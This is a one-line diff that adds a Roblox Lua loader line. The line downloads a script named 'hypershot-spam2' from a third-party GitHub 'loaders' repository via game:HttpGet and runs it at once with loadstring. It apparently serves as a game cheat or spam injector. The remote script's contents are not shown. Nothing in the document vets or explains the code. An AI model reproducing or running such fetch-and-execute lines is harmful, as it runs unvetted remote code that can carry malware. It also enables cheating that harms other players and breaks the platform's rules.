@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/hypershot-spam2-a23wr3ibkwriyc.lua"))()
